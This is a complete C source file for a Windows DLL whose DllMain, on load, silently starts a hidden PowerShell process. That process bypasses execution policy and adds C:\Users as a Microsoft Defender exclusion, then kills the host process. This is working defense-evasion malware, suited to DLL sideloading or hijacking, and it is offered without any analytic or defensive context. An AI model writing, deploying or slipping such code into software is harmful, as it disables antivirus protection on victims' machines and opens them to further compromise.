#include <windows.h>

BOOL StartPowerShell()
{
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    WCHAR pspath[MAX_PATH];

    if (!GetSystemDirectoryW(pspath, MAX_PATH - 20))
    {
        return FALSE;
    }

    lstrcatW(pspath, L"\\WindowsPowerShell\\v1.0\\powershell.exe");

    memset(&pi, 0, sizeof(pi));
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    
    WCHAR cmdline[MAX_PATH * 3];
    lstrcpyW(cmdline, L"\"");
    lstrcatW(cmdline, pspath);
    lstrcatW(cmdline, L"\" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath 'C:\\Users'\"");

    if (CreateProcessW(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return TRUE;
    }
    return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        StartPowerShell();
        ExitProcess(0);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
